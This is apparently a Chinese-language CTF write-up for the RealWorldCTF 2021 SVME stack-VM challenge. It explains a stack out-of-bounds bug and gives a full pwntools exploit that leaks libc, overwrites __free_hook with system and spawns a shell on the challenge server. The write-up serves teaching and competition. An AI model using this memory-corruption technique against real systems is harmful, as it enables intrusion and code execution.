# RealWorldCTF2021-SVME


# SVME

程序为一个简易的虚拟机，在Github上可以找到作者的源码，程序也没有去除符号。这个虚拟机更接近一个栈机器，它没有实现任何通用寄存器，而是使用栈进程数据保存和参数传递。

## Vuln

我找到的bug是栈越界。栈指针可以越界到code数据结构和全局数据结构，这样就可以改写其全局数据指针。另外，其调用栈是直接申请在上下文结构中的，这里同样可以越界。通过load和store指令不断的写内存，将全局数据指针覆盖为code指针，code是从存放在程序的栈中的，可以从中得到libc指针。通过计算覆盖指针为free_hook，然后写free_hook为system，在free_hook-8写“/bin/sh”。

```c
from pwn import *

def leak(name, addr): return log.success(
    '{0}\t--->\t{1}'.format(name, hex(addr)))

binary = './svme'
# binary = './svme'
libc = './libc-2.31.so'
context.terminal = ['tmux', 'splitw', '-h']
context.binary = binary
context.log_level = 'debug'
# p = process(binary)
p = remote('47.243.140.252', 1337)
elf = ELF(binary, checksec=False)
libc = ELF(libc, checksec=False)


def noop():
    return p32(0)
def iadd():
    return p32(1)
def isub():
    return p32(2)
def imul():
    return p32(3)
def ilt():
    return p32(4)
def ieq():
    return p32(5)
def br(addr):
    return p32(6)+p32(addr)
def brt(addr):
    return p32(7)+p32(addr)
def brf(addr):
    return p32(8)+p32(addr)
def iconst(data):
    return p32(9)+p32(data)
def load(offset):
    return p32(10)+p32(offset)
def gload(offset):
    return p32(11)+p32(offset)
def store(offset):
    return p32(12)+p32(offset)
def gstore(offset):
    return p32(13)+p32(offset)
def print_():
    return p32(14)
def pop():
    return p32(15)
def ret():
    return p32(17)
def halt():
    return p32(18)

# gdb.attach(p, "b vm_exec")
cmd = ''
cmd += gload(0xfffff7c0)+gload(0xfffff7c1)  # save code pointer
cmd += print_()*5                           # sp to *global
cmd += load(0xfffffc22) + load(0xfffffc23)  # over write global
cmd += iconst(0)                            # recover sp value
cmd += gload(0x86) + iconst(0x1c7a75-8) + iadd()     # save libc pointer
cmd += gload(0x87)                          # save libc pointer
cmd += print_()*5
cmd += load(0xfffffc22) + load(0xfffffc23)  # over write global to free_hook-8
cmd += iconst(0)                            # recover sp value 
cmd += load(0xfffffc22) + iconst(0x199710) + \
    isub() + load(0xfffffc22-2)  # calc system addr
cmd += gstore(3) + gstore(2)                # overwrite free_hook
cmd += iconst(0x6e69622f) + gstore(0)       # /bin/sh
cmd += iconst(0x0068732f) + gstore(1)  
cmd += halt()                           # pwn!

p.send(cmd.ljust(0x128*4, '\x00'))

p.interactive()

```


